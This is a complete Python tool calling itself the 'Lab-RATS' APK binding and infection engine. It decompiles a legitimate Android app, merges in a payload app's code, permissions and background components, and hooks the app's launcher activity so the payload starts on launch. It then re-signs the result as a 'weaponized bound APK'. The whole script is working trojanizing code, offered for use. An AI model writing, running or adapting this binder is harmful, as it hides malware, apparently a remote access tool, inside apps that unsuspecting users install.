#!/usr/bin/env python3
"""
===================================================================
                       Lab-RATS Smali Surgery
                 APK Binding & Infection Engine
                         v1.6.0 Hardened
===================================================================
Developed by K4N3CO © 2026

Automated Smali Surgery Engine:
1. Decompiles clean target APK and Lab-RATS payload APK via apktool.
2. Merges Lab-RATS Smali classes, assets, and native libraries.
3. Injects permissions & service/receiver components into target AndroidManifest.xml.
4. Identifies target's main launcher Activity and hooks onCreate() with LabRatsWorker.init().
5. Recompiles, zipaligns, and signs the weaponized bound APK.
"""

import sys
import os
import shutil
import subprocess
import urllib.request
import re
import argparse
import xml.etree.ElementTree as ET

ANDROID_NS = "http://schemas.android.com/apk/res/android"
ET.register_namespace('android', ANDROID_NS)

BANNER = """
 ┌───────────────────────────────────────────────────────────────────────┐
 │                                                                       │
 │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │
 │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │
 │     ██║     ███████║██████╔╝█████╗██████╔╝███████║  ██████╗    │
 │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │
 │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
 │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
 │                                                                       │
 │     ---------> Smali Surgery & APK Binding Engine <----------         │
 │                         DEVELOPED BY K4N3CO                           │
 └───────────────────────────────────────────────────────────────────────┘
"""

APKTOOL_URL = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"


def log_info(msg):
    print(f"\033[36m[*] {msg}\033[0m")


def log_success(msg):
    print(f"\033[32m[✓] {msg}\033[0m")


def log_warn(msg):
    print(f"\033[33m[!] {msg}\033[0m")


def log_err(msg):
    print(f"\033[31m[!] {msg}\033[0m")


def run_cmd(cmd, check=True):
    log_info(f"Executing: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    res = subprocess.run(cmd, shell=isinstance(cmd, str), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if check and res.returncode != 0:
        log_err(f"Command failed with code {res.returncode}:\n{res.stderr}")
        raise RuntimeError(f"Command failed: {res.stderr}")
    return res.stdout, res.stderr, res.returncode


def get_apktool_cmd(script_dir):
    """Detect or download apktool."""
    # Check system apktool
    if shutil.which("apktool"):
        return ["apktool"]

    tools_dir = os.path.join(script_dir, "tools")
    os.makedirs(tools_dir, exist_ok=True)
    jar_path = os.path.join(tools_dir, "apktool.jar")

    if not os.path.exists(jar_path):
        log_warn("Apktool not found on system PATH. Downloading apktool.jar v2.9.3...")
        try:
            urllib.request.urlretrieve(APKTOOL_URL, jar_path)
            log_success(f"Downloaded apktool.jar to {jar_path}")
        except Exception as e:
            log_err(f"Failed to download apktool: {e}")
            sys.exit(1)

    return ["java", "-jar", jar_path]


def decompile_apk(apktool_cmd, apk_path, output_dir):
    log_info(f"Decompiling {os.path.basename(apk_path)}...")
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    cmd = apktool_cmd + ["d", "-f", "-o", output_dir, apk_path]
    run_cmd(cmd)


def merge_smali_and_assets(payload_dir, target_dir):
    log_info("Merging payload Smali classes and assets into target...")

    # Find max smali index in target
    target_smali_dirs = [d for d in os.listdir(target_dir) if d == "smali" or d.startswith("smali_classes")]
    max_idx = 1
    for sd in target_smali_dirs:
        if sd == "smali":
            continue
        m = re.match(r"smali_classes(\d+)", sd)
        if m:
            idx = int(m.group(1))
            if idx > max_idx:
                max_idx = idx

    # Target directory for payload classes
    dest_smali_dir = os.path.join(target_dir, f"smali_classes{max_idx + 1}")
    os.makedirs(dest_smali_dir, exist_ok=True)

    # Copy all smali subdirectories from payload smali folders
    payload_smali_dirs = [d for d in os.listdir(payload_dir) if d == "smali" or d.startswith("smali_classes")]
    for psd in payload_smali_dirs:
        psd_path = os.path.join(payload_dir, psd)
        for item in os.listdir(psd_path):
            src_item = os.path.join(psd_path, item)
            dst_item = os.path.join(dest_smali_dir, item)

            # Check if target already has this package in main smali
            if os.path.exists(os.path.join(target_dir, "smali", item)) and item != "com":
                continue

            if os.path.isdir(src_item):
                if not os.path.exists(dst_item):
                    shutil.copytree(src_item, dst_item)
                else:
                    # Merge directories
                    for root, dirs, files in os.walk(src_item):
                        rel_path = os.path.relpath(root, src_item)
                        target_root = os.path.join(dst_item, rel_path)
                        os.makedirs(target_root, exist_ok=True)
                        for f in files:
                            sf = os.path.join(root, f)
                            df = os.path.join(target_root, f)
                            if not os.path.exists(df):
                                shutil.copy2(sf, df)

    # Copy Assets
    payload_assets = os.path.join(payload_dir, "assets")
    target_assets = os.path.join(target_dir, "assets")
    if os.path.exists(payload_assets):
        os.makedirs(target_assets, exist_ok=True)
        for root, dirs, files in os.walk(payload_assets):
            rel = os.path.relpath(root, payload_assets)
            dst_root = os.path.join(target_assets, rel)
            os.makedirs(dst_root, exist_ok=True)
            for f in files:
                sf = os.path.join(root, f)
                df = os.path.join(dst_root, f)
                if not os.path.exists(df):
                    shutil.copy2(sf, df)

    log_success("Payload Smali classes and assets successfully merged.")


def merge_manifests(payload_dir, target_dir):
    log_info("Performing AndroidManifest.xml surgery...")
    target_manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
    payload_manifest_path = os.path.join(payload_dir, "AndroidManifest.xml")

    with open(target_manifest_path, 'r', encoding='utf-8') as f:
        target_xml = f.read()

    with open(payload_manifest_path, 'r', encoding='utf-8') as f:
        payload_xml = f.read()

    pkg_match = re.search(r'package="([^"]+)"', target_xml)
    target_pkg = pkg_match.group(1) if pkg_match else "com.target.app"

    # Extract uses-permission tags from payload
    permissions = re.findall(r'(<uses-permission[^>]+/>)', payload_xml)
    added_perms = 0
    for perm in permissions:
        name_match = re.search(r'android:name="([^"]+)"', perm)
        if name_match:
            perm_name = name_match.group(1)
            if perm_name not in target_xml:
                if "<application" in target_xml:
                    target_xml = target_xml.replace("<application", f"    {perm}\n    <application", 1)
                    added_perms += 1

    # Extract Lab-RATS components
    components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*android:name="com\.labs\.labrats\.[^>]+>(?:.*?</(?:service|receiver|provider|activity)>|))', payload_xml, re.DOTALL)
    if not components:
        components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*com\.labs\.labrats[^>]+/>)', payload_xml)

    added_comps = 0
    for comp in components:
        comp_clean = comp.strip()
        # Prevent provider authority conflicts
        if "<provider" in comp_clean and "android:authorities=" in comp_clean:
            comp_clean = re.sub(r'android:authorities="([^"]+)"', f'android:authorities="{target_pkg}.\\1"', comp_clean)

        if "com.labs.labrats" in comp_clean and comp_clean not in target_xml:
            target_xml = target_xml.replace("</application>", f"        {comp_clean}\n    </application>", 1)
            added_comps += 1

    with open(target_manifest_path, 'w', encoding='utf-8') as f:
        f.write(target_xml)

    log_success(f"Manifest Surgery Complete: Injected {added_perms} permissions and {added_comps} components.")


def find_launcher_activity(target_dir):
    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
    tree = ET.parse(manifest_path)
    root = tree.getroot()

    package_name = root.attrib.get('package', '')
    app_elem = root.find('application')
    if app_elem is None:
        raise RuntimeError("No <application> element found in target AndroidManifest.xml")

    for act in app_elem.findall('activity') + app_elem.findall('activity-alias'):
        for intent in act.findall('intent-filter'):
            has_main = False
            has_launcher = False
            for action in intent.findall('action'):
                if action.attrib.get(f'{{{ANDROID_NS}}}name') == 'android.intent.action.MAIN':
                    has_main = True
            for cat in intent.findall('category'):
                if cat.attrib.get(f'{{{ANDROID_NS}}}name') == 'android.intent.category.LAUNCHER':
                    has_launcher = True

            if has_main and has_launcher:
                act_name = act.attrib.get(f'{{{ANDROID_NS}}}name')
                if act_name.startswith('.'):
                    act_name = package_name + act_name
                elif '.' not in act_name:
                    act_name = package_name + '.' + act_name
                return act_name

    raise RuntimeError("Launcher activity not found in target AndroidManifest.xml")


def hook_launcher_activity(target_dir, launcher_class):
    log_info(f"Injecting Smali hook into Launcher Activity: {launcher_class}")
    class_rel_path = launcher_class.replace('.', '/') + ".smali"

    smali_file = None
    for root, dirs, files in os.walk(target_dir):
        if "smali" in root:
            potential_path = os.path.join(root, class_rel_path)
            if os.path.exists(potential_path):
                smali_file = potential_path
                break

    if not smali_file:
        log_err(f"Could not find smali file for launcher class: {launcher_class}")
        sys.exit(1)

    with open(smali_file, 'r', encoding='utf-8') as f:
        content = f.read()

    hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"

    if "onCreate(" in content:
        def reg_replacer(match):
            header = match.group(1)
            body = match.group(2)
            reg_match = re.search(r'\.registers\s+(\d+)', header)
            if reg_match:
                reg_count = int(reg_match.group(1))
                if reg_count < 2:
                    header = header.replace(f".registers {reg_count}", ".registers 2")
            return header + body + hook_code

        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
        if re.search(pattern, content, re.DOTALL):
            content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
            log_success("Successfully hooked existing onCreate() method with register safety.")
        else:
            content = content.replace("onCreate(Landroid/os/Bundle;)V", "onCreate(Landroid/os/Bundle;)V\n" + hook_code, 1)
            log_success("Hook injected into onCreate() method header.")
    else:
        new_on_create = f"""
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2

    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
{hook_code}
    return-void
.endmethod
"""
        content += new_on_create
        log_success("Created and hooked new onCreate() method in launcher class.")

    with open(smali_file, 'w', encoding='utf-8') as f:
        f.write(content)


def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, storepass, keyalias):
    log_info("Rebuilding bound APK with apktool...")
    unsigned_apk = os.path.join(script_dir, "temp_binder", "unsigned_bound.apk")
    aligned_apk = os.path.join(script_dir, "temp_binder", "aligned_bound.apk")

    # Detect native stable AAPT1 (v1) to prevent AAPT2 exit code 138 SIGBUS crashes
    aapt_flag = []
    sdk_bt = os.path.expanduser("~/Library/Android/sdk/build-tools")
    if os.path.exists(sdk_bt):
        stable = [d for d in os.listdir(sdk_bt) if d.startswith("3") and not d.startswith("37")]
        if stable:
            stable.sort()
            bt_path = os.path.join(sdk_bt, stable[-1])
            aapt1 = os.path.join(bt_path, "aapt")
            if os.path.exists(aapt1):
                aapt_flag = ["--aapt", aapt1]

    cmd = apktool_cmd + ["b"] + aapt_flag + ["--no-crunch", target_dir, "-o", unsigned_apk]
    try:
        run_cmd(cmd)
    except Exception:
        log_warn("Retrying build with apktool default AAPT...")
        cmd_fallback = apktool_cmd + ["b", "-c", "--no-crunch", target_dir, "-o", unsigned_apk]
        run_cmd(cmd_fallback)

    # ZipAlign
    log_info("Aligning APK bytes with zipalign...")
    if shutil.which("zipalign"):
        run_cmd(["zipalign", "-p", "-f", "-v", "4", unsigned_apk, aligned_apk])
    else:
        log_warn("zipalign not found on system PATH; skipping alignment step.")
        aligned_apk = unsigned_apk

    # Sign APK
    log_info("Signing bound APK...")
    if shutil.which("apksigner"):
        run_cmd(["apksigner", "sign", "--ks", keystore_path, "--ks-pass", f"pass:{storepass}", "--ks-key-alias", keyalias, "--out", output_apk, aligned_apk])
    elif shutil.which("jarsigner"):
        run_cmd(["jarsigner", "-verbose", "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256", "-keystore", keystore_path, "-storepass", storepass, aligned_apk, keyalias])
        shutil.copy2(aligned_apk, output_apk)
    else:
        log_err("Neither apksigner nor jarsigner found on system PATH!")
        sys.exit(1)

    log_success(f"WEAPONIZED BOUND APK READY: {output_apk}")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Lab-RATS Smali Surgery & APK Binding Engine")
    parser.add_argument("--target", required=True, help="Path to target clean APK")
    parser.add_argument("--payload", help="Path to Lab-RATS payload APK")
    parser.add_argument("--output", help="Path to output bound APK")
    parser.add_argument("--keystore", help="Path to JKS keystore")
    parser.add_argument("--storepass", default="lab-rats123", help="Keystore password")
    parser.add_argument("--keyalias", default="lab-rats-key", help="Key alias")

    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.realpath(__file__))
    project_dir = os.path.dirname(script_dir)

    target_apk = os.path.abspath(args.target)
    if not os.path.exists(target_apk):
        log_err(f"Target APK not found: {target_apk}")
        sys.exit(1)

    payload_apk = args.payload
    if not payload_apk:
        default_payloads = [
            os.path.join(script_dir, "output", "signed_v1.apk"),
            os.path.join(project_dir, "app", "build", "outputs", "apk", "release", "app-release.apk"),
            os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
        ]
        for p in default_payloads:
            if os.path.exists(p):
                payload_apk = p
                break

    if not payload_apk or not os.path.exists(payload_apk):
        log_err("Payload APK not found! Please build Lab-RATS APK first or specify --payload.")
        sys.exit(1)

    output_dir = os.path.join(script_dir, "output")
    os.makedirs(output_dir, exist_ok=True)
    output_apk = args.output or os.path.join(output_dir, "bound_target.apk")

    keystore_path = args.keystore or os.path.join(project_dir, "lab-rats-keystore.jks")

    apktool_cmd = get_apktool_cmd(script_dir)

    work_dir = os.path.join(script_dir, "temp_binder")
    os.makedirs(work_dir, exist_ok=True)

    payload_dir = os.path.join(work_dir, "payload")
    target_dir = os.path.join(work_dir, "target")

    try:
        decompile_apk(apktool_cmd, payload_apk, payload_dir)
        decompile_apk(apktool_cmd, target_apk, target_dir)

        merge_smali_and_assets(payload_dir, target_dir)
        merge_manifests(payload_dir, target_dir)

        launcher_class = find_launcher_activity(target_dir)
        hook_launcher_activity(target_dir, launcher_class)

        recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, args.storepass, args.keyalias)

    finally:
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)


if __name__ == "__main__":
    main()
